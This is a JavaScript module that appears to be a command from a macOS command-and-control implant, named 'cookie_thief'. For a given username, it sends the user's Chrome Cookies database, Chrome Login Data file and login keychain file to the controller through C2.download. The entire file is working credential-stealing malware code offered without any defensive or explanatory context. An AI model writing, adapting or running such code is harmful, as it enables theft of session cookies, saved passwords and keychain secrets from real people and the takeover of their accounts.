exports.cookie_thief = function(task, command, params){
    let config = JSON.parse(params);
    let keyDL_status = {};
    let username = "";
    let browser = "chrome";
    let homedir = "/Users/";
    let keychainpath = "/Library/Keychains/login.keychain-db";
    let chromeCookieDir = "/Library/Application Support/Google/Chrome/Default/Cookies";
    let cookiedir = "/Library/Application Support/Google/Chrome/Default/Cookies";
    let logindir = "/Library/Application Support/Google/Chrome/Default/Login Data";

    if(config.hasOwnProperty("username") && typeof config['username'] == 'string' && config['username']) {
        username = config['username'];
    }
    else {
        return {'user_output': "Must supply the username", "completed": true, "status": "error"};
    }
    let cookiepath = homedir + username;

    if(config.hasOwnProperty("browser") && typeof config['browser'] == 'string'){
      browser = config['browser'];
    }

    if(browser === "chrome") {
        cookiedir = chromeCookieDir;
    }
    let cookieDLPath = cookiepath + cookiedir;
    let loginDLPath = cookiepath + logindir;

    try{
        let status = C2.download(task, cookieDLPath);
        if(!status.hasOwnProperty("file_id")){
            return status;
        }
    }
    catch(error)  {
        return {'user_output': error.toString(), "completed": true, "status": "error"};
    }
    try {
        let status = C2.download(task, loginDLPath);
        if(!status.hasOwnProperty("file_id")){
            return status;
        }
    }catch(error) {
        return {"user_output": error.toString(), "completed": true, "status": "error"};
    }

    let keypath = homedir + username + keychainpath;
    try{
        keyDL_status = C2.download(task, keypath);
    	  if(keyDL_status.hasOwnProperty("file_id")) {
              keyDL_status['user_output'] = "\nFinished Downloading KeychainDB, Cookies, and Login Data\n";
          }else{
    	      return keyDL_status;
          }
    }
    catch(error)  {
        return {'user_output': error.toString(), "completed": true, "status": "error"};
    }
    return keyDL_status;
};
